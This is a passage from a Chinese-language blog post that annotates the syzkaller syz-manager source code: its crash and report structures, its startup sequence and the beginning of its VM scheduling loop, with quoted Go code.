的新输入.</span><br><span class="hljs-comment">// 这是我们开始复现 crashes 的时候.</span><br>phaseTriagedHub<br>)<br></code></pre></td></tr></table></figure><h2 id="Fuzzing-结果相关"><a href="#Fuzzing-结果相关" class="headerlink" title="Fuzzing 结果相关"></a>Fuzzing 结果相关</h2><h3 id="1-Crash：记录-crash-信息"><a href="#1-Crash：记录-crash-信息" class="headerlink" title="1. Crash：记录 crash 信息"></a>1. Crash：记录 crash 信息</h3><p><code>manager.go</code> 中定义了<code>Crash</code> 结构体用以记录产生 crash 的 VM、机器信息等，<strong>真正的 crash 信息主要存放在一个 <code>Report</code> 结构体中</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Crash <span class="hljs-keyword">struct</span> &#123;<br>vmIndex <span class="hljs-type">int</span><br>hub     <span class="hljs-type">bool</span> <span class="hljs-comment">// this crash was created based on a repro from hub</span><br>*report.Report<br>machineInfo []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Report：单次执行结果报告"><a href="#2-Report：单次执行结果报告" class="headerlink" title="2. Report：单次执行结果报告"></a>2. Report：单次执行结果报告</h3><p><code>pkg/report/rteport.go</code> 中的 <code>Report</code> 结构体用以表示单次执行的结果，包括是否产生了 crash、Oops 的信息等等：</p><ul><li><p><code>Title</code>：<strong>Oops 的第一行文本，用来标识特定类型的 crash</strong></p><blockquote><p>例如 <code>BUG: unable to handle page fault for address: ffffffff81001619</code> 这样的</p></blockquote></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Report <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Title contains a representative description of the first oops.</span><br>Title <span class="hljs-type">string</span><br><span class="hljs-comment">// Alternative titles, used for better deduplication.</span><br><span class="hljs-comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span><br>AltTitles []<span class="hljs-type">string</span><br><span class="hljs-comment">// Bug type (e.g. hang, memory leak, etc).</span><br>Type Type<br><span class="hljs-comment">// The indicative function name.</span><br>Frame <span class="hljs-type">string</span><br><span class="hljs-comment">// Report contains whole oops text.</span><br>Report []<span class="hljs-type">byte</span><br><span class="hljs-comment">// Output contains whole raw console output as passed to Reporter.Parse.</span><br>Output []<span class="hljs-type">byte</span><br><span class="hljs-comment">// StartPos/EndPos denote region of output with oops message(s).</span><br>StartPos <span class="hljs-type">int</span><br>EndPos   <span class="hljs-type">int</span><br><span class="hljs-comment">// SkipPos is position in output where parsing for the next report should start.</span><br>SkipPos <span class="hljs-type">int</span><br><span class="hljs-comment">// Suppressed indicates whether the report should not be reported to user.</span><br>Suppressed <span class="hljs-type">bool</span><br><span class="hljs-comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span><br>Corrupted <span class="hljs-type">bool</span><br><span class="hljs-comment">// CorruptedReason contains reason why the report is marked as corrupted.</span><br>CorruptedReason <span class="hljs-type">string</span><br><span class="hljs-comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span><br>Recipients vcs.Recipients<br><span class="hljs-comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span><br>GuiltyFile <span class="hljs-type">string</span><br><span class="hljs-comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span><br>reportPrefixLen <span class="hljs-type">int</span><br><span class="hljs-comment">// symbolized is set if the report is symbolized.</span><br>symbolized <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-main-：加载配置文件，启动-manager"><a href="#0x02-main-：加载配置文件，启动-manager" class="headerlink" title="0x02. main()：加载配置文件，启动 manager"></a>0x02. main()：加载配置文件，启动 manager</h1><p><code>syz-manager</code> 的 <code>main()</code> 函数其实比较简单，主要就是载入配置文件信息并调用 <code>RunManager()</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> prog.GitRevision == <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)<br>&#125;<br>flag.Parse()<br>log.EnableLogCaching(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)<br>cfg, err := mgrconfig.LoadFile(*flagConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>RunManager(cfg)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><del>👴寻思好像没什么好说的</del></p></blockquote><h1 id="0x03-RunManager-：进行初始化工作"><a href="#0x03-RunManager-：进行初始化工作" class="headerlink" title="0x03. RunManager()：进行初始化工作"></a>0x03. RunManager()：进行初始化工作</h1><h3 id="Step-1-初始化-VM-Pool"><a href="#Step-1-初始化-VM-Pool" class="headerlink" title="Step 1. 初始化 VM Pool"></a>Step 1. 初始化 VM Pool</h3><p>首先是初始化 VM Pool，这里调用了 <code>vm/vm.go</code> 中的 <code>Create()</code> 来完成 VM pool 的创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmPool *vm.Pool<br>   <span class="hljs-comment">// &quot;none&quot; 类型对于调试/开发而言是一种特殊情况，manager 并不会启动任何 VM，</span><br>   <span class="hljs-comment">// 但相应的是你应当手动启动 VM 并在此启动 syz-fuzzer.</span><br><span class="hljs-keyword">if</span> cfg.Type != <span class="hljs-string">&quot;none&quot;</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>vmPool, err = vm.Create(cfg, *flagDebug)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要就是获取 VM 类型、封装一个 Env 结构体、调用对应类型 VM Pool 的构造函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 创建一个可用于创建独立 VMs 的 VM pool.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(cfg *mgrconfig.Config, debug <span class="hljs-type">bool</span>)</span></span> (*Pool, <span class="hljs-type">error</span>) &#123;<br>typ, ok := vmimpl.Types[cfg.Type]<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)<br>&#125;<br>env := &amp;vmimpl.Env&#123;<br>Name:      cfg.Name,<br>OS:        cfg.TargetOS,<br>Arch:      cfg.TargetVMArch,<br>Workdir:   cfg.Workdir,<br>Image:     cfg.Image,<br>SSHKey:    cfg.SSHKey,<br>SSHUser:   cfg.SSHUser,<br>Timeouts:  cfg.Timeouts,<br>Debug:     debug,<br>Config:    cfg.VM,<br>KernelSrc: cfg.KernelSrc,<br>&#125;<br>impl, err := typ.Ctor(env)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;Pool&#123;<br>impl:     impl,<br>workdir:  env.Workdir,<br>template: cfg.WorkdirTemplate,<br>timeouts: cfg.Timeouts,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-初始化-Manager，载入语料库，建立通信服务器"><a href="#Step-2-初始化-Manager，载入语料库，建立通信服务器" class="headerlink" title="Step 2. 初始化 Manager，载入语料库，建立通信服务器"></a>Step 2. 初始化 Manager，载入语料库，建立通信服务器</h3><p>随后会创建用于存储 crash 的文件夹与一个新的 Reporter 实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">crashdir := filepath.Join(cfg.Workdir, <span class="hljs-string">&quot;crashes&quot;</span>)<br>osutil.MkdirAll(crashdir)<br><br>reporter, err := report.NewReporter(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来创建一个基本的 Manager 实例，然后是四步走：</p><ul><li><p><code>preloadCorpus()</code>：检查 <code>corpus.db</code> 文件是否存在（若不存在则创建）并载入 <code>sys/要fuzz的OS/test</code> 目录下的测试用模板</p><blockquote><p>语料库载入的模板本身类似于 syzlang 文件，例如 <code>sys/linux/pipe</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">pipe2(&amp;(0x7f0000000000)=&#123;&lt;r0=&gt;0x0, &lt;r1=&gt;0x0&#125;, 0x0)<br>close(r0)<br>close(r1)<br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>initStats()</code>：注册一个 prometheus 监视器（一个开源的监视&amp;预警工具包）</p></li><li><p><code>initHTTP()</code>：创建一个 HTTP 服务器并注册一系列的目录（用以供使用者访问）</p></li><li><p><code>collectUsedFiles()</code>：检查所需文件是否存在</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">mgr := &amp;Manager&#123;<br>cfg:              cfg,<br>vmPool:           vmPool,<br>target:           cfg.Target,<br>sysTarget:        cfg.SysTarget,<br>reporter:         reporter,<br>crashdir:         crashdir,<br>startTime:        time.Now(),<br>stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="hljs-string">&quot;&quot;</span>&#125;,<br>crashTypes:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>corpus:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem),<br>disabledHashes:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>memoryLeakFrames: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>dataRaceFrames:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>fresh:            <span class="hljs-literal">true</span>,<br>vmStop:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>hubReproQueue:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Crash, <span class="hljs-number">10</span>),<br>needMoreRepros:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>reproRequest:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>usedFiles:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time),<br>saturatedCalls:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>&#125;<br><br>mgr.preloadCorpus()<br>mgr.initStats() <span class="hljs-comment">// 初始化 prometheus 变量.</span><br>mgr.initHTTP()  <span class="hljs-comment">// 创建 HTTP 服务.</span><br>mgr.collectUsedFiles()<br></code></pre></td></tr></table></figure><p>之后创建一个 RPC Server，用以在 Host 与 Guest VMs 之间进行通信：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 为 fuzzer 创建 PRC 服务器.</span><br>mgr.serv, err = startRPCServer(mgr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create rpc server: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-3-初始化-dashboard-相关"><a href="#Step-3-初始化-dashboard-相关" class="headerlink" title="Step 3.  初始化 dashboard 相关"></a><em>Step 3.  初始化 dashboard 相关</em></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> cfg.DashboardAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create dashapi connection: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;<br>mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to init asset storage: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-4-创建【日志输出】协程"><a href="#Step-4-创建【日志输出】协程" class="headerlink" title="Step 4. 创建【日志输出】协程"></a>Step 4. 创建【日志输出】协程</h3><p>接下来会新起一个协程进行数据记录的工作，内部其实就是一个<strong>每 10s 进行一次进度采集并输出日志的无限循环</strong>，主要是采集执行信息、语料覆盖率、crashes 信息等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>now := time.Now()<br>diff := now.Sub(lastTime)<br>lastTime = now<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))<br>executed := mgr.stats.execTotal.get()<br>crashes := mgr.stats.crashes.get()<br>corpusCover := mgr.stats.corpusCover.get()<br>corpusSignal := mgr.stats.corpusSignal.get()<br>maxSignal := mgr.stats.maxSignal.get()<br>mgr.mu.Unlock()<br>numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)<br>numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v&quot;</span>,<br>numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><h3 id="Step-5-创建-bench-协程（每隔一分钟最小化语料库并将-bench-data-写入-bench-文件）"><a href="#Step-5-创建-bench-协程（每隔一分钟最小化语料库并将-bench-data-写入-bench-文件）" class="headerlink" title="Step 5. 创建 bench 协程（每隔一分钟最小化语料库并将 bench data 写入 bench 文件）"></a>Step 5. 创建 bench 协程（每隔一分钟最小化语料库并将 bench data 写入 bench 文件）</h3><p>这里会判断命令行传入参数是否有 <code>bench=</code>，若是则调用 <code>initBench()</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> *flagBench != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.initBench()<br>&#125;<br></code></pre></td></tr></table></figure><p> 这里的 <code>flagBench</code> 是一个全局的 flag 变量，golang 提供了一个 <code>flag</code> 包用以处理命令行参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>flagConfig = flag.String(<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;configuration file&quot;</span>)<br>flagDebug  = flag.Bool(<span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;dump all VM output to console&quot;</span>)<br>flagBench  = flag.String(<span class="hljs-string">&quot;bench&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;write execution statistics into this file periodically&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p><code>initBench()</code> 会启动一个协程，主要就是一个每隔一分钟运行一次的循环：</p><ul><li>调用 <code>minimizeCorpus()</code> 将语料库进行最小化</li><li>向 <code>bench</code> 参数指定的文件当中写入 <code>语料库长度、启动时间、fuzzing 时间\n</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> initBench() &#123;<br>f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to open bench file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Minute)<br>vals := mgr.stats.all()<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.minimizeCorpus()<br>vals[<span class="hljs-string">&quot;corpus&quot;</span>] = <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(mgr.corpus))<br>vals[<span class="hljs-string">&quot;uptime&quot;</span>] = <span class="hljs-type">uint64</span>(time.Since(mgr.firstConnect)) / <span class="hljs-number">1e9</span><br>vals[<span class="hljs-string">&quot;fuzzing&quot;</span>] = <span class="hljs-type">uint64</span>(mgr.fuzzingTime) / <span class="hljs-number">1e9</span><br>mgr.mu.Unlock()<br><br>data, err := json.MarshalIndent(vals, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to serialize bench data&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> _, err := f.Write(<span class="hljs-built_in">append</span>(data, <span class="hljs-string">&#x27;\n&#x27;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write bench data&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-6-启动-dashboard-协程，进入下一阶段"><a href="#Step-6-启动-dashboard-协程，进入下一阶段" class="headerlink" title="Step 6. 启动 dashboard 协程，进入下一阶段"></a>Step 6. 启动 dashboard 协程，进入下一阶段</h3><p>接下来会启动一个新的协程，主要是 <em>每隔一分钟上报一次 syz-manager 的状态，这里不再展开</em> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> mgr.dash != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> mgr.dashboardReporter()<br>&#125;<br></code></pre></td></tr></table></figure><p>最后会简单检查一下 VM Pool ，随后调用 <code>vmLoop()</code> 进入下一阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">osutil.HandleInterrupts(vm.Shutdown)<br><span class="hljs-keyword">if</span> mgr.vmPool == <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;no VMs started (type=none)&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)<br>&lt;-vm.Shutdown<br><span class="hljs-keyword">return</span><br>&#125;<br>mgr.vmLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-vmLoop-：启动-fuzzing，管控整体流程"><a href="#0x04-vmLoop-：启动-fuzzing，管控整体流程" class="headerlink" title="0x04. vmLoop()：启动 fuzzing，管控整体流程"></a>0x04. vmLoop()：启动 fuzzing，管控整体流程</h1><h2 id="一、VM-分组，初始化资源池等变量"><a href="#一、VM-分组，初始化资源池等变量" class="headerlink" title="一、VM 分组，初始化资源池等变量"></a>一、VM 分组，初始化资源池等变量</h2><p>一开始首先会将所有的 VM 分为两组：一组负责 fuzzing，一组负责复现 crash （<code>maxReproVMs</code>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Manager needs to be refactored (#605).</span><br><span class="hljs-comment">// nolint: gocyclo, gocognit, funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> vmLoop() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;booting test machines...&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;wait for the connection from test machine...&quot;</span>)<br>instancesPerRepro := <span class="hljs-number">4</span><br>vmCount := mgr.vmPool.Count()<br>maxReproVMs := vmCount - mgr.cfg.FuzzingVMs<br><span class="hljs-keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="hljs-number">0</span> &#123;<br>instancesPerRepro = maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>随后会调用 <code>SequentialResourcePool()</code> 新建一个 <code>ResourcePool</code> 队列，主要负责对<strong>空闲 VM 使用顺序</strong>的调控 ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">instances := SequentialResourcePool(vmCount, <span class="hljs-number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)<br></code></pre></td></tr></table></figure><p>接下来会初始化一系列的变量：</p><ul><li><code>runDone</code>：保存 fuzzing 结果为 crash 的 <strong>Crash 队列</strong></li><li><code>pendingRepro</code>：标识<strong>待复现的 Crash</strong></li><li><code>reproducing</code>：标识<strong>某个类型 Crash</strong> 是否准备被复现</li><li><code>reproQueue</code>：Crash 的复现队列</li><li><code>reproDone</code>：Crash 的复现结果</li><li><code>stopPending</code>：等待停止标志位</li><li><code>shutdown</code>：工作终止标志位</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">runDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *RunResult, <span class="hljs-number">1</span>)<br>pendingRepro := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Crash]<span class="hljs-type">bool</span>)<br>reproducing := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> reproQueue []*Crash<br>reproDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ReproResult, <span class="hljs-number">1</span>)<br>stopPending := <span class="hljs-literal">false</span><br>shutdown := vm.Shutdown<br></code></pre></td></tr></table></figure><p>最后进入到一个大循环中，这个大循环才是真正的 fuzzing 调控流程</p><h2 id="二、外层大循环：调配空闲-VM-进行-fuzz-amp-crash-repro，等待处理不同-channel-数据"><a href="#二、外层大循环：调配空闲-VM-进行-fuzz-amp-crash-repro，等待处理不同-channel-数据" class="headerlink" title="二、外层大循环：调配空闲 VM 进行 fuzz 